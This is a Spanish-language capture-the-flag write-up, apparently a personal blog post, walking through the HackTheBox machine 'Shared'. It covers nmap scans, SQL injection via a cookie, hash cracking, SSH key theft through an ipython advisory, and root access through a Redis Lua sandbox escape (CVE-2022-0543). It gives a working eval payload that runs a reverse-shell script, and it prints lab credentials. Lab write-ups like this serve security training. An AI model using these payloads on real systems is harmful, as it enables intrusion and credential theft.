---
layout: post
title: "Write Up Shared. "
subtitle: "Starting-Point"
category: Blog
tags: [Medium,Chunin,Linux,HTB,SQLi,BurpSuite,Hashes,RCE,SSH,Web,Vulnerability-Assessment,Database,Injection,Source-Code-Analysis,Outdated-Software,Reversing,Redis,MariaDB,Chisel,Bash,Reconnaissance,Web-Site-Structure-Discovery,Binary-Analysis,Password-Cracking,Dictionary-attack,Port-Forwarding,Weak-Credentials,Clear-Text-Credentials,eWPT,OSCP] 
image:
  path: /assets/img/shared/shared.png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.172 -oA allports -Pn
```

![list](/assets/img/shared/A-2022-11-22-12-00-17.png){:.lead width="800" height="100" loading="lazy"}


### Services and Versions


```bash
nmap -p22,80,443 -sV -sC 10.10.11.172 -oN target
```

![list](/assets/img/shared/A-2022-11-22-12-01-25.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros tambien ispeccionamos la web ademas de las tecnologias de la ip ataves de la terminal o via  web esto lo hacemos con wapalizzer o whatweb.


Ademas de haver encontrado en el escaneo de Nmap el nombre de dominio shared.htb que lo meteremos en el /etc/host y procederemos a fuzzear  ademas tambien nos dice que es un gestor de contenido  prestashop.


Husemando la pagina tambien azoma un subdominio checkout.shared.htb que tambien nos aparece a la hora de fuzzear.


![list](/assets/img/faculty/Kali-2022-09-06-23-40-34.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Ingresamos el dominio al /etc/hosts. 


Fuzzeamos la web con gobuster o dirbuster.


```bash
dirsearch -u https://shared.htb
```


```bash
wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://shared.htb/" -H "Host: FUZZ.shared.htb"
```

![list](/assets/img/shared/A-2022-11-22-12-14-16.png){:.lead width="800" height="100" loading="lazy"}


Despues de provar multiples cosas observamos que tenemos dos cookies una de prestashob y otra custom card depues de juagar con la de custon card notamos que es vulnerable a sql injection haci que en la web mismo probamos las tipicas querys para obtener informacion.


![list](/assets/img/shared/A-2022-11-22-12-23-09.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos el nombre de la base de datos que es `checkout`. 


Para mas comodidad nos abrimos el burpsuite para inteceptar y escribir las consultas mejor.


![list](/assets/img/shared/A-2022-11-22-12-33-19.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos el nombre de tabla que es `user`. 


![list](/assets/img/shared/A-2022-11-22-12-33-53.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos el nombre de de usuario que es `james_mason`.  


![list](/assets/img/shared/A-2022-11-22-12-34-16.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos un hash que procedemos crakear con john the ripper y que es `Soleil101`.  


Ya con usuario y password nos conectamos atraves de SSH y ya podemos buscar la flag de usuario no privileguiado en el escritorio del usuatio `dan_smith` por lo que deberos hacer un user-pivoting para con vertirnos en dan y poder ver la flag de user.txt.


![list](/assets/img/shared/A-2022-11-22-12-36-13.png){:.lead width="800" height="100" loading="lazy"}


***

## Explatation and Escalation Privileges


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find con el siguite comando.


```bash
find /-group developer 2>/dev/null
```


{:.note}
Nos aparece la ruta `/opt/scripts_review`, no metemos pero esta vacio pero tenemos capaciada de escritura.


Si miramos con pspy los procesos podemos ver que el uid 1001 ejecuta algunas cosas muy interesantes.


![list](/assets/img/shared/A-2022-11-22-12-44-20.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Notamos que ipython esta ejecutando un scrip asi que vuscando vulnerabilidades sobre [ipython] aparecio esta.


[ipython]:(https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x)


Siguendo la logica de la vulnerabilidad hacemos lo ismo pero en la misma ruta y en ver de inprimir algo nos vamos a copiar la `id_rsa` de usuario dan_smith en la ruta `/dev/shm/key`.


![list](/assets/img/shared/Captura%20de%20pantalla%20(280).png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Nos la vamos a copiar en la maquina atacate con el nombre de `ir_rsa` y le vamos da dar permiso `chmod 600 id_rsa` y nos vamos a conectar por ssh como `ssh -i dam_smith@10.10.11.191`.


![list](/assets/img/shared/A-2022-11-22-13-02-05.png){:.lead width="800" height="100" loading="lazy"}


Como el usuario `dan_smith` ya podemos ver la flag de bajos privilegios.


![list](/assets/img/shared/A-2022-11-22-13-03-43.png){:.lead width="800" height="100" loading="lazy"}


Podemos ver que tenemos el grupo `sysadmin`, también que con ese grupo existe un binario.


```bash
find / -group sysadmin 2>/dev/null
```


Esta ejecutando un binario `/usr/local/bin/redis_connector_dev` que ejecutarlo vemos que se autentica a redis por lo que debe tener una contraseña, por lo que nos lo tranferimos a la maquina atacante y lo ejecutamos pero nos ponemos con netcat a la ecucaha de la siguiente manera `nc -lvnp 6379` y nos dara la contraseña `F2WHqJUz2WEz=Gqq`.


Nos conectamos con [redis-cli], buscando un poco logramos encontrar una vulnerabilidad que si la explotamos conseguimos ejecutar comandos, hacemos una reverse shell y somos root.


```bash
redis_cli
```


El lo suguiente ponemos `AUTH F2WHqJUz2WEz=Gqq`.


Nos creamos un archivo sh que ejcute una reverseshell.  


![list](/assets/img/shared/Kali-2022-09-07-13-06-11.png){:.lead width="800" height="100" loading="lazy"}


Y con lo que leimos en la vulnerabilidad ejecutamos el comando.


```shell
eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0
```


{:.note}
Debemos ponernos a la escucha con netcat en el puerto 443.


[redis-cli]:(https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/)


![list](/assets/img/shared/Kali-2022-09-07-13-07-53.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Ya podemos buscar la flag de root en su escritorio.


***

```shell
🎉 Felicitaciones ya has comprometido Shared de HackTheBox 🎉
```
{:.centered}
***

Back to [Certification eWPT](2023-07-03-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSCP](){:.heading.flip-title}
{:.read-more}